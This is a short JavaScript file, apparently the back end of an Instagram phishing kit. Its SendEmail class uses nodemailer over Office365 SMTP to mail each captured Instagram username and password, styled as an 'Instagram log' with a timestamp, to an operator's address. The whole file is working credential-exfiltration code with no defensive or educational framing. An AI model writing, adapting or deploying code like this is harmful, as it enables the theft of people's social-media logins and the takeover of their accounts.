import nodemailer from "nodemailer";

class SendEmail {
  constructor(smtpEmail, smtpPassword) {
    this.smtpEmail = smtpEmail;
    this.transporter = nodemailer.createTransport({
      host: "smtp.office365.com",
      port: 587,
      secure: false,
      auth: {
        user: smtpEmail,
        pass: smtpPassword,
      },
    });
  }
  async send(email, username, password) {
    const { transporter, smtpEmail } = await this;
    await transporter.sendMail({
      from: `"Instagram log" <${smtpEmail}>`,
      to: email,
      subject: `New log`,
      html: `
      <!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Login</title>
          <link rel="stylesheet" href="styles.css" />
          <style>
            @import url("https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap");
          </style>
        </head>
      
        <body
          style="
            width: 100%;
            background-color: rgba(17, 0, 255, 0.222);
            box-sizing: border-box;
            margin: auto;
            font-weight: lighter;
            color: rgba(0, 0, 0, 0.69);
            padding: 200px 0px;
          "
        >
          <div
            style="
              margin: auto;
              width: 300px;
              background-color: aliceblue;
              padding: 25px;
              border-radius: 20px;
            "
          >
            <div>
              <h3 style="font-family: 'Roboto', sans-serif; text-align: center">
                Instagram Log
              </h3>
            </div>
            <div>username : ${username}</div>
            <div>password : ${password}</div>
            <div><hr /></div>
            <div>Date: ${Date()}</div>
          </div>
        </body>
      </html>
      
        `,
    });
  }
}

export { SendEmail };
